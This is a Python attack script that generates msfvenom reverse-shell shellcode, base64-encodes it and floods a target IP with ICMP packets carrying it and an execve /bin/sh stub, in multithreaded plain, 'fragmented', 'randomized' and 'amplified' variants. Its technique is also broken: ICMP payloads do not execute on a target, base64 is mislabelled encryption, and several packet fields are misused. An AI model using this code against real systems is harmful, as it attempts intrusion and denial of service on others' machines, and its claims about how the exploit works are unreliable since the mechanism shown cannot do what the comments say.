import os
import socket
import time
import subprocess
import threading
from scapy.all import IP, ICMP, Raw, send, RandShort
import base64

def generate_shellcode(payload, lhost, lport):
    try:
        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 3 -f raw"
        print(f"Running command: {command}")
        result = subprocess.run(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")
        return result.stdout
    except  Exception as  e:
        print(f"[-] Error generating shellcode: {e}")

def encrypt_shellcode(shellcode):
    encrypted_shellcode = base64.b64encode(shellcode)
    return encrypted_shellcode

def create_exploit_packet(encrypted_shellcode, target_ip):
    # Create a packet that instructs the target machine to decrypt the packet and run the shellcode
    exploit_code = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    packet = IP(dst=target_ip)/ICMP()/Raw(load=exploit_code + encrypted_shellcode)
    return packet

def send_exploit_packets(target_ip, encrypted_shellcode, duration):
    try:
        end_time = time.time() + duration
        packet = create_exploit_packet(encrypted_shellcode, target_ip)
        threads = []
        max_threads = os.cpu_count() * 2

        def send_exploit_packet_thread():
            try:
                while time.time() < end_time:
                    try:
                        send(packet, verbose=False)
                        print(f"[+] Exploit packet sent to {target_ip}")
                    except  Exception as  e:
                        print(f"[-] Error sending exploit packet: {e}")
                        break
            except  Exception as  e:
                print(f"[-] Error sending exploit packet: {e}")

        for _ in range(max_threads):
            t = threading.Thread(target=send_exploit_packet_thread)
            t.daemon = True
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    except  Exception as  e:
        print(f"[-] Error sending exploit packets: {e}")

def send_exploit_packets_fragmented(target_ip, encrypted_shellcode, duration):
    try:
        end_time = time.time() + duration
        packet = create_exploit_packet(encrypted_shellcode, target_ip)
        threads = []
        max_threads = os.cpu_count() * 2

        def send_exploit_packet_thread_fragmented():
            try:
                while time.time() < end_time:
                    try:
                        packet.fragmented = True
                        send(packet, verbose=False)
                        print(f"[+] Fragmented exploit packet sent to {target_ip}")
                    except  Exception as  e:
                        print(f"[-] Error sending fragmented exploit packet: {e}")
                        break
            except  Exception as  e:
                print(f"[-] Error sending fragmented exploit packet: {e}")

        for _ in range(max_threads):
            t = threading.Thread(target=send_exploit_packet_thread_fragmented)
            t.daemon = True
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    except  Exception as  e:
        print(f"[-] Error sending fragmented exploit packets: {e}")

def send_exploit_packets_randomized(target_ip, encrypted_shellcode, duration):
    try:
        end_time = time.time() + duration
        packet = create_exploit_packet(encrypted_shellcode, target_ip)
        threads = []
        max_threads = os.cpu_count() * 2

        def send_exploit_packet_thread_randomized():
            try:
                while time.time() < end_time:
                    try:
                        packet.src = RandShort()
                        packet.dport = RandShort()
                        send(packet, verbose=False)
                        print(f"[+] Randomized exploit packet sent to {target_ip}")
                    except  Exception as  e:
                        print(f"[-] Error sending randomized exploit packet: {e}")
                        break
            except  Exception as  e:
                print(f"[-] Error sending randomized exploit packet: {e}")

        for _ in range(max_threads):
            t = threading.Thread(target=send_exploit_packet_thread_randomized)
            t.daemon = True
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    except  Exception as  e:
        print(f"[-] Error sending randomized exploit packets: {e}")

def send_exploit_packets_amplified(target_ip, encrypted_shellcode, duration):
    try:
        end_time = time.time() + duration
        packet = create_exploit_packet(encrypted_shellcode, target_ip)
        threads = []
        max_threads = os.cpu_count() * 2

        def send_exploit_packet_thread_amplified():
            try:
                while time.time() < end_time:
                    try:
                        packet.src = RandShort()
                        packet.dport = RandShort()
                        packet.len = 1400
                        send(packet, verbose=False)
                        print(f"[+] Amplified exploit packet sent to {target_ip}")
                    except  Exception as  e:
                        print(f"[-] Error sending amplified exploit packet: {e}")
                        break
            except  Exception as  e:
                print(f"[-] Error sending amplified exploit packet: {e}")

        for _ in range(max_threads):
            t = threading.Thread(target=send_exploit_packet_thread_amplified)
            t.daemon = True
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    except  Exception as  e:
        print(f"[-] Error sending amplified exploit packets: {e}")

def main(target_ip, payload, lhost, lport, duration):
    shellcode = generate_shellcode(payload, lhost, lport)
    encrypted_shellcode = encrypt_shellcode(shellcode)
    send_exploit_packets(target_ip, encrypted_shellcode, duration)
    send_exploit_packets_fragmented(target_ip, encrypted_shellcode, duration)
    send_exploit_packets_randomized(target_ip, encrypted_shellcode, duration)
    send_exploit_packets_amplified(target_ip, encrypted_shellcode, duration)
